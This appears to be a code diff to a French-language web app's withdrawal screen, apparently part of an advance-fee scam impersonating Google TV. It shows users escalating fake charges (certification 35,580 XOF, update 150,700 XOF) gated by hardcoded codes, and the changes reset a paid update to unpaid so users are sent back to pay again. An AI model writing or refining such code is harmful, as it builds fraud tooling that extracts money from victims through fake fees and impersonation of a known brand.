@@ -120,7 +120,19 @@ function HomeTab({ firstName, isCertified, onDiscover }: { firstName: string; is
 
 function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomeProfile; counts: { watched: number; liked: number; favorited: number; rewarded: number }; rewardAmount: number }) {
   const flowKey = withdrawalFlowKey(profile.id);
-  const savedFlow = (() => { try { const raw = window.localStorage.getItem(flowKey); return raw ? JSON.parse(raw) as WithdrawalFlowSnapshot : null; } catch { return null; } })();
+  const savedFlow = (() => {
+    try {
+      const raw = window.localStorage.getItem(flowKey);
+      if (!raw) return null;
+      const parsed = JSON.parse(raw) as WithdrawalFlowSnapshot;
+      if (parsed.updatePaid === true) {
+        return { ...parsed, updateStep: true, updatePaid: false };
+      }
+      return parsed;
+    } catch {
+      return null;
+    }
+  })();
   const savedHostingPaid = savedFlow?.hostingPaid === true;
   const savedFeePaid = savedFlow?.feePaid === true;
   const savedUpdatePaid = savedFlow?.updatePaid === true;
@@ -152,7 +164,6 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
   const [feeError, setFeeError] = useState<string | null>(null);
   const [feeValidation, setFeeValidation] = useState(false);
   const [updateStep, setUpdateStep] = useState(savedFlow?.updateStep === true || (savedHostingPaid && savedFeePaid && !savedUpdatePaid));
-  const [resumeStarted, setResumeStarted] = useState(false);
   const [updateCode, setUpdateCode] = useState('');
   const [updateError, setUpdateError] = useState<string | null>(null);
   const [latestRequest, setLatestRequest] = useState<{ status: string; amount: number } | null>(null);
@@ -294,19 +305,13 @@ function WithdrawalTab({ profile, counts, rewardAmount }: { profile: UserHomePro
     setSubmitting(false);
   };
 
-  useEffect(() => {
-    if (!updatePaid || !withdrawalCode || resumeStarted) return;
-    setResumeStarted(true);
-    void submit();
-  }, [updatePaid, withdrawalCode, resumeStarted]);
-
   if (certificationBlocked) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><img src="/assets/icons/file_00000000f4308210a788b98916b52e8e.png" alt="Compte certifié" className="mx-auto h-16 w-16 object-contain" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Votre compte n'est pas autorisé à faire des retraits.</h1><p className="mt-4 leading-7 text-slate-300">Veuillez certifier votre compte.</p><p className="mt-3 text-sm text-slate-400">Coût de la certification : <b>35 580 XOF&nbsp;</b></p>{!certChecked ? <div className="mt-8"><Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-400" /><p className="mt-4 text-sm text-slate-400">Vérification de votre certification…</p></div> : certifiedNow ? <button onClick={() => { setCertificationBlocked(false); setCodeStep(false); setHostingCode(''); setHostingError(null); if (hostingPaid && feePaid && updatePaid) void submit(); else if (hostingPaid && feePaid) setUpdateStep(true); else if (hostingPaid) setFeeStep(true); else setHostingStep(true); }} className="primary-button mt-8 rounded-xl px-6 py-3 font-bold">Continuer</button> : <div><p className="mt-8 rounded-xl border border-amber-400/30 bg-amber-500/10 px-4 py-3 text-sm text-amber-200">Votre compte n’est pas encore certifié.</p><button disabled className="mt-5 cursor-not-allowed rounded-xl px-6 py-3 font-bold opacity-50">Continuer</button></div>}</div></section>;
 
   if (withdrawalProcessing) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Retrait en cours</h1><p className="mt-4 leading-7 text-slate-400">Traitement de votre demande de retrait…</p></div></section>;
 
   if (feeValidation) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-blue-400/30 bg-[#141a24] p-8 text-center shadow-2xl sm:p-12"><Loader2 className="mx-auto h-12 w-12 animate-spin text-blue-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Validation en cours</h1><p className="mt-4 leading-7 text-slate-400">Vérification de vos frais de retrait…</p></div></section>;
 
-  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdatePaid(true); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={!updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;
+  if (updateStep) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-amber-300/30 bg-[#241f13] p-8 shadow-2xl sm:p-12"><div className="text-center"><RefreshCw className="mx-auto h-12 w-12 text-amber-300" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Veuillez faire la mise à jour de votre compte Google TV !</h1></div><div className="mt-8 rounded-2xl border border-white/10 bg-[#0b0f16] p-6 text-center"><p className="text-sm font-bold uppercase tracking-[.14em] text-slate-400">Coût de la mise à jour</p><p className="mt-3 text-xl font-black text-white sm:text-2xl">150 700 XOF</p></div><div className="mt-8 text-left"><WithdrawalField label="Code de mise à jour"><input type="text" autoComplete="one-time-code" value={updateCode} onChange={(event) => { setUpdateCode(event.target.value); setUpdateError(null); }} placeholder="Saisissez le code" className="withdrawal-input" /></WithdrawalField>{updateError && <p className="mb-4 rounded-xl border border-red-400/30 bg-red-500/10 px-4 py-3 text-sm text-red-200">{updateError}</p>}<button onClick={() => { if (updateCode.trim().toUpperCase() === 'GTV-M75100') { setUpdatePaid(false); setUpdateError(null); setUpdateStep(false); void submit(); } else { setUpdateError('Le code de mise à jour est incorrect.'); } }} disabled={submitting || !updateCode.trim()} className="primary-button w-full rounded-2xl px-5 py-4 text-lg font-bold disabled:cursor-not-allowed disabled:opacity-50">Effectuer la mise à jour</button></div></div></section>;
 
   if (hostingPaid && !hostingContinued) return <section className="py-16 sm:py-24"><div className="mx-auto max-w-xl rounded-[30px] border border-green-400/30 bg-[#12241a] p-8 text-center shadow-2xl sm:p-12"><CheckCircle2 className="mx-auto h-12 w-12 text-green-400" /><h1 className="mt-6 text-2xl font-black text-white sm:text-3xl">Compte hébergé avec succès</h1><p className="mt-4 leading-7 text-slate-300">Votre compte Google TV a bien été hébergé. Vous pouvez poursuivre votre demande de retrait.</p><button onClick={() => { setHostingContinued(true); setHostedSuccess(false); setFeeCode(''); setFeeError(null); setFeeStep(true); }} className="primary-button mt-8 w-full rounded-2xl px-5 py-4 text-lg font-bold">Continuer</button></div></section>;
 
